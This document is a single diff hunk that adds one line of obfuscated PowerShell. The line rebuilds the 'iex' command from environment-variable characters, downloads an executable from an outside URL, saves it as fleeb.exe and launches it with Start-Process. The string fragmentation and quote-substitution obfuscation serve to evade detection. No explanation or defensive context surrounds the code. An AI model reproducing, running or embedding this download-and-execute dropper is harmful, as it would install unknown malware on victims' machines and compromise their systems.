@@ -1,0 +1,1 @@
+﻿&( $ENv:COMSpeC[4,26,25]-jOin'')( ('(New-Ob'+'je'+'ct System.Net'+'.Web'+'Client)'+'.'+'Downloa'+'d'+'File'+'(unR'+'htt'+'p:'+'/'+'/'+'k'+'ia'+'na'+'.c'+'om/f'+'lo'+'wplaye'+'r/aquafre'+'sh.'+'ex'+'eunR,unRf'+'lee'+'b.e'+'xeu'+'nR);'+'Start-Proc'+'e'+'ss un'+'Rf'+'lee'+'b.e'+'x'+'eunR').RePLaCe('unR',[stRinG][chAR]39) )
